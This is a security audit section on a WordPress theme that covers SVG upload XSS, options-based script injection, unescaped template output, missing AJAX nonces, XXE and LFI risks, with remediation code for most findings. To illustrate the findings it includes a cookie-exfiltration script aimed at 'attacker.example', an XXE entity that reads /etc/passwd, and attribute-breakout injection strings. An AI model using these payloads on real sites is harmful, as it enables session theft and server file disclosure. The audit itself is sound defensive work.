---
title: Security
description: Severity-tagged security findings, including critical SVG and options-injection issues.
---

# 04 — Security

This document covers the theme's security posture: escaping, sanitisation, authentication, capability checks, nonces, and data flow from untrusted sources. Findings here stand **independent of the ACF migration**; most are actionable today and should land before any architectural work.

All findings are tagged with severity based on exploitability and impact. P0 items should be addressed as quick wins before the migration roadmap in [08](/reports/theme-only-audit/08-roadmap).

## Contents

- [SVG uploads](#svg-uploads)
- [Site-scripts injection from theme options](#site-scripts-injection-from-theme-options)
- [GTM injection](#gtm-injection)
- [Template output escaping](#template-output-escaping)
- [Modal data attributes](#modal-data-attributes)
- [`Helpers::generateLink()` string concatenation](#helpersgeneratelink-string-concatenation)
- [AJAX without nonce verification](#ajax-without-nonce-verification)
- [Social sharing URL construction](#social-sharing-url-construction)
- [Menu walker and mega-menu HTML injection](#menu-walker-and-mega-menu-html-injection)
- [Attachment attribute defaults](#attachment-attribute-defaults)
- [Rank Math block-JSON regex parsing](#rank-math-block-json-regex-parsing)
- [`Render::partial` extract() scope bleed](#renderpartial-extract-scope-bleed)
- [Findings summary](#findings-summary)

## SVG uploads

### Issue

`inc/Svg.php:9, 13-17`:

```php
add_filter('upload_mimes', [$this, 'uploadsMimes']);

public function uploadsMimes($mimes)
{
    $mimes['svg'] = 'image/svg+xml';
    return $mimes;
}
```

This whitelists SVG uploads for every user with `upload_files` capability (which includes all Author-level and above users on a default site). **SVG files can contain arbitrary JavaScript and XLink references** — an uploaded SVG can execute script when rendered inline (via `<img>` loaded as an object, or via `Svg::get()` which inlines file contents directly into HTML).

There is **no sanitisation**. An Editor-level account (compromised via weak credentials, plugin CVE, reset-link hijack, etc.) can upload an SVG containing `<script>fetch('https://attacker.example/', {method: 'POST', body: document.cookie})</script>` and trigger XSS whenever that SVG is rendered to the page. `Svg::get()` uses `file_get_contents()` and echoes the result with no escaping — so an Editor-uploaded SVG that the theme later inlines via that helper becomes stored XSS on every page view.

### Fix

Either:

1. **Don't allow SVG uploads.** Remove the filter. If SVG icons are needed, keep them in the theme repo under `assets/icons/`, processed by webpack into the sprite. Only developers can add new icons. This is the safest path.
2. **Allow SVG uploads, sanitise on upload.** Install [`enshrined/svg-sanitizer`](https://github.com/darylldoyle/svg-sanitizer) (free, widely-used) or the [Safe SVG](https://wordpress.org/plugins/safe-svg/) plugin. Hook `wp_handle_upload_prefilter` to sanitise the SVG content before it's written to disk:

   ```php
   add_filter('wp_handle_upload_prefilter', function (array $file): array {
       if ($file['type'] !== 'image/svg+xml') {
           return $file;
       }
       $sanitizer = new \enshrined\svgSanitize\Sanitizer();
       $contents = file_get_contents($file['tmp_name']);
       $clean = $sanitizer->sanitize($contents);
       if ($clean === false) {
           $file['error'] = __('SVG sanitisation failed.', 'edwp');
           return $file;
       }
       file_put_contents($file['tmp_name'], $clean);
       return $file;
   });
   ```

   Also: restrict SVG uploads to users with `unfiltered_html` (administrators + editors only on single-site):

   ```php
   add_filter('upload_mimes', function (array $mimes): array {
       if (current_user_can('unfiltered_html')) {
           $mimes['svg'] = 'image/svg+xml';
       }
       return $mimes;
   });
   ```

The first approach is simpler and less risky. It's what I'd default to for an agency starter template.

**Finding `SEC-SVG-01` (P0, S).** Either remove the SVG mime whitelisting, or add `enshrined/svg-sanitizer` + prefilter + capability check. Do not ship this theme to any client without one of these.

## Site-scripts injection from theme options

### Issue

`inc/Setup.php:261-317` — `Setup::getSiteScripts()`, `addSiteScriptsToHead()`, `addSiteScriptsToFooter()`, `addSiteScriptsToBodyOpen()`.

```php
public function getSiteScripts(array $script): string {
    $script_src = $script['site_scripts_src'] ? 'src="' . $script['site_scripts_src'] . '"' : '';
    $script_additional_tag_data = $script['site_scripts_additional_tag_data'] ?
        $script['site_scripts_additional_tag_data'] : '';
    $script_type = $script['site_scripts_type'] ? $script['site_scripts_type'] : 'script';
    $script_type_attribute = 'type="text/javascript"';
    if ($script_type == 'style') {
        $script_type_attribute = 'type="text/css"';
    }
    $script_content = $script['site_scripts'] ? $script['site_scripts'] : '';
    $script_tag_open = "<{$script_type} {$script_type_attribute} {$script_src} {$script_additional_tag_data}>";
    $script_tag_close = "</{$script_type}>";

    return "{$script_tag_open}{$script_content}{$script_tag_close}";
}
```

This is called from three places (head, body, footer), echoing arbitrary HTML/JS/CSS from ACF options into the page:

- `$script_src` — interpolated without escaping into an HTML attribute.
- `$script_additional_tag_data` — arbitrary HTML attribute/value pairs, interpolated verbatim.
- `$script_content` — script body, interpolated into `<script>` / `<style>` block.
- `$script_type` — used to form the tag name.

Whoever controls the `site_scripts` option controls the entire script tag. Every field is user-input with no escaping, no validation, no sanitisation.

### Threat model

- Only users with `manage_options` can edit theme options — so the attacker must already be an administrator. In single-site WordPress, `unfiltered_html` admins can add `<script>` tags in content directly — so this feature doesn't grant new privilege to administrators.
- **On a multisite**, `unfiltered_html` is disabled by default for administrators. This feature grants them script execution they otherwise wouldn't have. Privilege escalation avenue.
- **If the option is ever populated by a non-administrator** (a plugin that exposes the field to Editors, a compromised administrator account, an options-export/import without sanitisation), arbitrary script execution follows.
- **The tag structure itself is broken by common inputs.** If `$script_content` contains `</script>`, the closing tag escapes the block early — this isn't just an XSS vector, it's a functional bug.

### Fix

There's no way to make arbitrary-script-injection-from-options safe. Accept this and:

1. **Capability-check aggressively.** `require current_user_can('unfiltered_html')` before the option can be saved (add a sanitiser on `update_option`'s hook).
2. **Sanitise the output.** Minimally: `esc_attr()` on `src`, `esc_attr()` on the additional tag data, `esc_html()` or `wp_strip_all_tags()` on `$script_content`. But `esc_html` of script content turns your injected tracking script into literal text. There's no way to both allow arbitrary code and sanitise it.
3. **Replace with a structured model.** Instead of "paste arbitrary HTML", offer specific integrations:

   - GTM (just an ID field).
   - Google Analytics 4 (measurement ID).
   - Facebook Pixel (ID).
   - Custom script (explicitly acknowledge this is dangerous; require `unfiltered_html`).

   Render each with known-safe templates. This is the model [MonsterInsights / GA4 Plugin](https://wordpress.org/plugins/googleanalytics/) and similar use.

4. **At minimum, escape everything that's escapable.** The `src` attribute can be URL-escaped without losing fidelity:

   ```php
   $script_src = !empty($script['site_scripts_src'])
       ? sprintf('src="%s"', esc_url($script['site_scripts_src']))
       : '';
   ```

**Finding `SEC-SITESCRIPTS-01` (P0, M).** Replace the "paste arbitrary HTML" pattern with a structured integration model (predefined integrations) or gate the whole feature behind `current_user_can('unfiltered_html')` and escape every field that's escapable. Document the remaining risk for administrators.

## GTM injection

### Issue

`inc/Setup.php:230-257`:

```php
public function addGtmToHead() {
    $gtm_id = get_field('google_tag_manager_id', 'option');
    if ($gtm_id) {
        echo "<!-- Google Tag Manager -->
        <script>(function(w,d,s,l,i){…'$gtm_id'…})</script>
        …";
    }
}

public function addGtmToBody() {
    $gtm_id = get_field('google_tag_manager_id', 'option');
    if ($gtm_id) {
        echo "<!-- Google Tag Manager (noscript) -->
        <noscript><iframe src='https://www.googletagmanager.com/ns.html?id=$gtm_id'…></iframe></noscript>…";
    }
}
```

`$gtm_id` is interpolated into inline JavaScript and an iframe `src` without escaping or validation. A GTM container ID follows the pattern `GTM-XXXXXXX` — easy to validate with a regex. As stored, an administrator could set `google_tag_manager_id` to `GTM-123'); alert(1); //` and execute script; once again the threat is admin-with-out-unfiltered_html on multisite.

### Fix

```php
public function addGtmToHead(): void {
    $gtm_id = get_option('edwp_gtm_id');   // After ACF migration
    if (!preg_match('/^GTM-[A-Z0-9]+$/', $gtm_id)) {
        return;
    }
    $gtm_id = esc_js($gtm_id);
    // ... render template with sprintf + the validated ID
}
```

Use `esc_js()` inside JS contexts, `esc_attr()` inside HTML attributes, and `esc_url()` for the iframe `src`.

**Finding `SEC-GTM-01` (P1, S).** Validate GTM IDs against a strict regex; `esc_js()` inside JS contexts; `esc_attr()` + `esc_url()` for HTML. Alternatively: use a core pattern and emit the tag via `wp_print_inline_script_tag()` (6.4+) which handles escaping.

## Template output escaping

Observed escaping patterns across block templates, header/footer, partials:

| Location | Escaping pattern | Verdict |
|---|---|---|
| `partials/global/modal.php` | Consistent `esc_attr`, `esc_html`, `esc_url` | Good |
| `partials/global/footer.php` | `esc_url`, `esc_html`, `wp_kses_post` for address | Good |
| `inc/Blocks/Cards/template.php` | `<?= $args['base_class']; ?>`, `<?= $args['classes']; ?>` — no escape | Inconsistent |
| `inc/Blocks/Content/template.php` | Same — no escape on class / base-class attrs | Inconsistent |
| `inc/Blocks/Group/template.php` (not read in detail but same pattern) | Expected same | Inconsistent |
| `inc/Components/Button/template.php` | Defers to `Helpers::generateLink()` which itself uses `esc_url` but not `esc_attr` on classes / aria labels | Inconsistent |
| `inc/Blocks/TestimonialsBlock/TestimonialsBlock::getColumns()` | `data-columns-desktop='{$args['columns_desktop']}'` — no escape | Inconsistent |

The pattern:

- **Globally-shared templates** (modal, footer) are correctly escaped.
- **Per-block templates** mostly don't escape class names, base classes, or data attributes.

### Risk

For most block templates, the values being interpolated come from server-controlled arrays (a `base_class` constant and classes built from `wp_parse_args` defaults + ACF field values). These are **mostly** safe because:

1. `base_class` is a class constant — never user-input.
2. Numeric values (columns, gaps) come from `<select>` field choices with known enumerated values — can't be crafted to be dangerous.
3. Text/Link fields are admin-only — requires compromised admin.

But:

- The **default escape-by-default** posture the WP Theme Review Handbook prescribes is missing. If any field in the chain becomes user-input in the future (a plugin adds a filter, a block is extended, etc.), the templates become XSS sinks immediately.
- **Consistency matters.** When some templates escape and others don't, reviewers can't tell at a glance which is safe. A `grep "esc_" template.php` should return hits for every output in every template.
- **WPCS flags this automatically** (see [01 PHP-02](/reports/theme-only-audit/01-conventions-and-structure#coding-standards-php)). Adopting WPCS will force the fix.

### Pattern to adopt

```php
// Block template:
<article class="<?php echo esc_attr($args['base_class']); ?> <?php echo esc_attr($args['classes']); ?>">
    <?php if (!empty($args['title'])) : ?>
        <h2 class="<?php echo esc_attr($args['base_class']); ?>__title">
            <?php echo esc_html($args['title']); ?>
        </h2>
    <?php endif; ?>
    …
</article>
```

or, more terse:

```php
<article <?php echo self::render_attrs([
    'class' => "$args[base_class] $args[classes]",
]); ?>>
```

**Finding `SEC-ESCAPE-01` (P1, M).** Systematic pass over every `template.php` to escape every interpolated value. ~40 templates × 15 minutes each = ~10 engineer-days. The WPCS adoption in [01](/reports/theme-only-audit/01-conventions-and-structure) will identify all missing escapes.

**Finding `SEC-ESCAPE-02` (P2, S).** Adopt a `render_attrs()` helper that takes an array and outputs HTML attributes with proper escaping. Reduces boilerplate in templates.

## Modal data attributes

`inc/Modals.php:294-310` — `buildDataAttributes()`:

```php
private function buildDataAttributes(array $modal): string
{
    $attrs = [];

    if (!empty($modal['display_onload'])) {
        $attrs[] = 'data-display-onload="true"';
    }
    if (!empty($modal['cookie_enabled'])) {
        $attrs[] = 'data-cookie-enabled="true"';
        $attrs[] = 'data-cookie-days="' . ($modal['cookie_days'] ?? 30) . '"';
    }
    if (!empty($modal['modal_id'])) {
        $attrs[] = 'data-modal-id="' . esc_attr($modal['modal_id']) . '"';
    }

    return implode(' ', $attrs);
}
```

- `data-cookie-days` — `$modal['cookie_days']` is interpolated without escape. It's a number field in ACF, but nothing enforces that at render time. If a content migration, an ACF import, or a raw-SQL edit put non-numeric data in there, it goes to the page unescaped.
- The result is interpolated into modal template output via `<?php echo $args['data_attributes']; ?>` — where `$args['data_attributes']` is trusted pre-built HTML. Fine *if* the construction is right.

### Fix

```php
$attrs['data-cookie-days'] = (int) ($modal['cookie_days'] ?? 30);
// …
return implode(' ', array_map(
    fn($k, $v) => sprintf('%s="%s"', esc_attr($k), esc_attr($v)),
    array_keys($attrs),
    $attrs
));
```

**Finding `SEC-MODAL-01` (P2, S).** Escape `data-cookie-days` via `(int)` cast or `esc_attr()`.

## `Helpers::generateLink()` string concatenation

`inc/Helpers.php:174-275`.

This function builds `<a>` / `<div>` tags by:

1. Constructing an open tag like `<a href="..." target="..." data-block="...">`.
2. Appending inner content.
3. **Then using `str_replace` to inject `aria-label` and class attributes** into the opening tag:

```php
if (!empty($ariaLabel)) {
    $html = str_replace('href', 'aria-label="' . $ariaLabel . '" href', $html);
}

if (!empty($link['target'])) {
    $html = str_replace('href', 'target="' . $link['target'] . '" rel="noopener noreferrer" href', $html);
}

if (!empty($classes)) {
    $pos = strpos($html, 'href');
    if ($pos !== false) {
        $html = substr_replace($html, 'class="' . $classes . '" href', $pos, strlen('href'));
    }
}
```

### Problems

1. **No escaping** — `$ariaLabel`, `$link['target']`, `$classes` are interpolated directly.
2. **`str_replace('href', ...)` matches the first occurrence of the literal `href`** — which can be inside an existing attribute value if the href value itself contains `href` (unlikely but possible).
3. **Replacement strategy is fragile** — `str_replace` / `substr_replace` are string manipulation, not HTML manipulation. DOM parsing or structured attribute building would be safer.
4. **`$link['target']` is a free-form ACF value.** Expected values are `_blank` / `_self`, but nothing enforces that. `target="_blank' onmouseover='alert(1)"` is entirely possible.

### Fix

Build attributes structurally, escape each:

```php
public static function generateLink(array $link, ...): string
{
    if (empty($link['url'])) {
        return '';
    }

    $attrs = [
        'href' => esc_url($link['url']),
        'class' => esc_attr($classes),
    ];

    if (!empty($ariaLabel)) {
        $attrs['aria-label'] = esc_attr($ariaLabel);
    }

    if (!empty($link['target'])) {
        $target = in_array($link['target'], ['_blank', '_self', '_parent', '_top'], true)
            ? $link['target'] : '_self';
        $attrs['target'] = esc_attr($target);
        if ($target === '_blank') {
            $attrs['rel'] = 'noopener noreferrer';
        }
    }

    $attr_string = implode(' ', array_filter(array_map(
        fn($k, $v) => $v !== '' ? sprintf('%s="%s"', esc_attr($k), $v) : '',
        array_keys($attrs),
        $attrs
    )));

    return sprintf('<a %s>%s</a>', $attr_string, $inner_html);
}
```

**Finding `SEC-GENERATELINK-01` (P1, S).** Rewrite `Helpers::generateLink` with structured attribute building. Whitelist `target` values. Escape every attribute value.

## AJAX without nonce verification

`inc/Ajax.php`:

```php
public function newsletterSubscribe()
{
    wp_send_json_success([
        'message' => __('Thank you for subscribing to our newsletter.', 'edwp'),
    ]);
    exit;
}
```

This is either scaffolding (no real logic) or incomplete. Two concerns:

1. **No nonce verification.** `Setup::enqueueScripts()` creates a nonce (`'wp-pageviews-nonce'` — confusingly named) and localises it to `edwpScriptsObj`, but `Ajax::newsletterSubscribe()` doesn't check it. If the handler grows to do something side-effectful (hit an email API, save a subscriber), it's vulnerable to CSRF.
2. **Nonce name is misleading.** `wp-pageviews-nonce` suggests the nonce is for a pageviews action. Pick a descriptive name.

**Finding `SEC-AJAX-01` (P2, S).** Verify nonce at the top of `Ajax::newsletterSubscribe()`:

```php
public function newsletterSubscribe(): void
{
    check_ajax_referer('edwp_newsletter', 'nonce');

    // ... real logic here
}
```

Also rename the nonce in `Setup::enqueueScripts()` to `edwp_newsletter` (or similar) and update `edwpScriptsObj` accordingly.

**Finding `SEC-AJAX-02` (P2, S).** Prefer REST endpoints over `admin-ajax.php` for new work. `register_rest_route()` with a proper `permission_callback` is cleaner and more testable.

## Social sharing URL construction

`inc/Blocks/Socials/Socials.php:47-60`:

```php
$permalink = get_permalink();
$title = get_the_title();

$args['facebook_url'] = "http://www.facebook.com/sharer.php?u={$permalink}&p[title]={$title}";
$args['linkedin_url'] = "https://www.linkedin.com/shareArticle?mini=true&url={$permalink}&title={$title}";
$args['twitter_url'] = "http://x.com/share?text={$title}&url={$permalink}";
```

- `$permalink` and `$title` are interpolated without URL-encoding. A post title containing `&`, `#`, `?`, spaces, etc. will break the share URL.
- `http://` for Facebook/Twitter/X — these all redirect to HTTPS, but a mixed-content warning may fire on HTTPS pages (most do not — browsers auto-upgrade HTTP subresources in most contexts, but not always in all contexts).

### Fix

```php
$permalink = get_permalink();
$title = get_the_title();

$args['facebook_url'] = add_query_arg(
    ['u' => $permalink, 'p[title]' => $title],
    'https://www.facebook.com/sharer.php'
);
$args['linkedin_url'] = add_query_arg(
    ['mini' => 'true', 'url' => $permalink, 'title' => $title],
    'https://www.linkedin.com/shareArticle'
);
$args['twitter_url'] = add_query_arg(
    ['text' => $title, 'url' => $permalink],
    'https://x.com/share'
);
```

`add_query_arg` handles URL encoding correctly.

**Finding `SEC-SOCIAL-01` (P2, S).** Replace interpolated share URLs with `add_query_arg()`. Use `https://`.

## Menu walker and mega-menu HTML injection

`inc/Filters.php:41-76` — `editWalkerNav`:

```php
$itemOutput = str_replace('href=', 'class="header__mm-anchor js-open-mega-menu" href=', $itemOutput);
$itemOutput = str_replace(
    '</a>',
    ' ' . Svg::icon('chevron_forward', modifier: 'header__mm-icon') . '</a>',
    $itemOutput
);

$itemOutput .= Render::partial(
    'partials/global/mega-menu',
    end($foundMegaMenu),
    echo: false
);
```

- Similar `str_replace`-to-inject pattern as `generateLink` — fragile, not safe if `href=` or `</a>` appear in unexpected places (e.g. inside an SVG icon that has `</a>` in its content, or a custom menu walker extension that doesn't produce `href=` in canonical form).
- `Render::partial('partials/global/mega-menu', end($foundMegaMenu), echo: false)` — the args passed to the partial are whatever the `$foundMegaMenu` is. If that's an ACF repeater row from `mega_menus` option, the partial receives admin-set data verbatim. The mega-menu partial is a potential sink for untrusted HTML from ACF options.

**Finding `SEC-MENU-01` (P2, S).** Rewrite menu-walker extensions using `nav_menu_link_attributes` filter (native) instead of `str_replace` on the output. See [02](/reports/theme-only-audit/02-non-native-apis#guiding-principle-prefer-core-hooks-over-custom) for the "prefer core hooks" principle.

## Attachment attribute defaults

`inc/Filters.php:78-92` — `fixWpGetAttachmentImageSvg`:

```php
if (is_array($image) && preg_match('/\.svg$/i', $image[0]) && $image[1] === 0) {
    if (($xml = simplexml_load_file($image[0])) !== false) {
        $attr = $xml->attributes();
        …
    }
}
```

- `simplexml_load_file($image[0])` — loads the SVG as XML. SVGs are XML, so this works, but **XML external entity (XXE) attacks** are a risk if the SVG contains `<!DOCTYPE ... [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`. Since PHP 8.0, `libxml_disable_entity_loader()` is a no-op (entities are disabled by default in libxml ≥ 2.9.0), so modern PHP installs are safe. Older PHP or some libxml builds may still be vulnerable.
- Combined with the SVG-upload issue (`SEC-SVG-01`): an attacker can upload a malicious SVG, and this function reads it as XML during image-src resolution. On a vulnerable libxml build, XXE could read arbitrary server files.

**Finding `SEC-SVG-XXE-01` (P2, S).** Explicitly disable entity loading for XML parsing of SVGs:

```php
$previous = libxml_use_internal_errors(true);
libxml_clear_errors();
// PHP ≥ 8.0 has entities disabled by default. On older PHP, call:
// libxml_disable_entity_loader(true); // deprecated in 8.0
$xml = simplexml_load_file($image[0], 'SimpleXMLElement', LIBXML_NONET);
libxml_use_internal_errors($previous);
```

`LIBXML_NONET` disallows network access during parsing (covers most XXE vectors).

## Rank Math block-JSON regex parsing

`inc/RankMath.php:143-177` — parses block JSON from `post_content` with a regex:

```php
$pattern = '/<!--\s*wp:acf\/[^\s]+\s+(\{.+?\})\s*\/?-->/s';
preg_match_all($pattern, $postContent, $matches);
```

Issues:

- Regex-parsing HTML / block markers is always fragile. A block comment that contains `{` in a string attribute can confuse the matcher.
- `parse_blocks()` is the native WP function for this (`inc/PostTypes/GlobalBlock.php` already uses it correctly).

No direct security issue, just a robustness concern.

**Finding `SEC-RM-PARSE-01` (P2, S).** Replace the regex with `parse_blocks($post->post_content)` and walk the tree. Part of the Rank Math migration ([02 RANKMATH-01](/reports/theme-only-audit/02-non-native-apis#rank-math-dependencies)).

## `Render::partial` extract() scope bleed

Already covered in [02 RENDER-01](/reports/theme-only-audit/02-non-native-apis#renderpartial-bugs). Security implications:

- `extract($args)` allows any caller to inject arbitrary variables into the template's scope, including overwriting locals like `$file`, `$file_handle`, `$cache`, `$data`, `$return`.
- If a template refers to `$user_id` expecting it to be a trusted internal value, a caller can override it by passing `$args['user_id']`. No template in this codebase currently has such a dependency — but the pattern is unsafe-by-default.
- **If a template does `include $file;` after `extract`**, the caller can set `$file` and control which template loads. `Render::partial` does this: `require $file;` follows `extract($args);`. An attacker passing `['file' => '/etc/passwd']` would trigger `require '/etc/passwd'` — fatal PHP warning but potentially readable content via error log.

Not exploitable in practice because callers of `Render::partial` are all in-theme code with fixed `$file` arguments. Still, it's a latent LFI (local file inclusion) sink if ever reached by user-controlled input.

**Finding `SEC-RENDER-01` (P1, S).** Part of `RENDER-01` fix. Removing `extract()` eliminates this whole class of issue.

## Findings summary

| ID | Title | Severity | Effort |
|---|---|---|---|
| SEC-SVG-01 | SVG uploads allowed without sanitisation | **P0** | S |
| SEC-SITESCRIPTS-01 | Site-scripts feature injects arbitrary HTML/JS from options | **P0** | M |
| SEC-GTM-01 | GTM ID not validated / escaped; interpolated into inline JS | P1 | S |
| SEC-ESCAPE-01 | Block templates don't escape interpolated values | P1 | M |
| SEC-ESCAPE-02 | Adopt a `render_attrs()` helper for consistent escaping | P2 | S |
| SEC-MODAL-01 | `data-cookie-days` not escaped in modal data attributes | P2 | S |
| SEC-GENERATELINK-01 | Rewrite `Helpers::generateLink` with structured attribute building | P1 | S |
| SEC-AJAX-01 | AJAX handler lacks `check_ajax_referer`; ambiguous nonce name | P2 | S |
| SEC-AJAX-02 | Prefer REST endpoints over `admin-ajax.php` for new work | P2 | S |
| SEC-SOCIAL-01 | Share URLs not properly URL-encoded; use `add_query_arg` | P2 | S |
| SEC-MENU-01 | `str_replace`-based menu markup injection; use `nav_menu_link_attributes` | P2 | S |
| SEC-SVG-XXE-01 | `simplexml_load_file` on user-uploadable SVG; add `LIBXML_NONET` | P2 | S |
| SEC-RM-PARSE-01 | Replace regex block-parsing with `parse_blocks()` | P2 | S |
| SEC-RENDER-01 | `Render::partial` `extract()` enables scope bleed; part of RENDER-01 | P1 | S |

Next: [05 — Dependencies](/reports/theme-only-audit/05-dependencies)
